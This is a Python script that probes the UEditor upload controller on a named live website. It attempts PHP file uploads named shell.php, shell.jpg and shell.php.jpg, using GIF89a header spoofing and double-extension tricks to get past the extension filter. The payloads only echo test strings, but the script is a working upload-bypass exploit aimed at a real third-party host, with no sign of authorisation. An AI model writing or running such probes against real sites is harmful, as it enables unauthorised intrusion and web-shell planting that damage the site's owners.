#!/usr/bin/env python3
"""gz UEditor upload probe - test uploadfile/uploadimage with various filenames"""
import urllib.request, urllib.parse, uuid, io, re, http.cookiejar, mimetypes

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0"}
CK = "/tmp/gz_ued.cookies"

def fetch(url, timeout=12, fields=None):
    """multipart POST"""
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    parts = []
    if fields:
        for k, v in fields.items():
            if isinstance(v, tuple):  # (filename, content, ctype)
                fn, content, ctype = v
                parts.append(('--' + boundary).encode())
                parts.append(('Content-Disposition: form-data; name="%s"; filename="%s"' % (k, fn)).encode())
                parts.append(('Content-Type: %s' % ctype).encode())
                parts.append(b'')
                parts.append(content if isinstance(content, bytes) else content.encode())
                parts.append(b'')
            else:
                parts.append(('--' + boundary).encode())
                parts.append(('Content-Disposition: form-data; name="%s"' % k).encode())
                parts.append(b'')
                parts.append(str(v).encode())
                parts.append(b'')
    parts.append(('--' + boundary + '--').encode())
    body = b'\r\n'.join(parts)
    req = urllib.request.Request(url, data=body, headers={
        **UA, "Content-Type": "multipart/form-data; boundary=" + boundary,
        "Accept": "*/*"})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

# 1. uploadfile with .php (should be blocked by allowFiles)
code, resp = fetch(HOST + "/Extend/Ueditor2/php/controller.php?action=uploadfile",
                   fields={"upfile": ("shell.php", '<?php echo "GZ_TEST_1"; ?>', "application/octet-stream")})
print("1) uploadfile .php:", code, resp[:200])

# 2. uploadimage with .php content in .jpg
code, resp = fetch(HOST + "/Extend/Ueditor2/php/controller.php?action=uploadimage",
                   fields={"upfile": ("shell.jpg", 'GIF89a<?php echo "GZ_TEST_2"; ?>', "image/jpeg")})
print("2) uploadimage .jpg(php content):", code, resp[:200])

# 3. uploadfile with .jpg but content php
code, resp = fetch(HOST + "/Extend/Ueditor2/php/controller.php?action=uploadfile",
                   fields={"upfile": ("a.jpg", '<?php echo "GZ_TEST_3"; ?>', "image/jpeg")})
print("3) uploadfile .jpg(php content):", code, resp[:200])

# 4. uploadfile .txt (allowed per config)
code, resp = fetch(HOST + "/Extend/Ueditor2/php/controller.php?action=uploadfile",
                   fields={"upfile": ("a.txt", 'GZ_TXT_TEST_4', "text/plain")})
print("4) uploadfile .txt:", code, resp[:200])

# 5. uploadfile .php.jpg double ext
code, resp = fetch(HOST + "/Extend/Ueditor2/php/controller.php?action=uploadfile",
                   fields={"upfile": ("shell.php.jpg", '<?php echo "GZ_TEST_5"; ?>', "image/jpeg")})
print("5) uploadfile .php.jpg:", code, resp[:200])
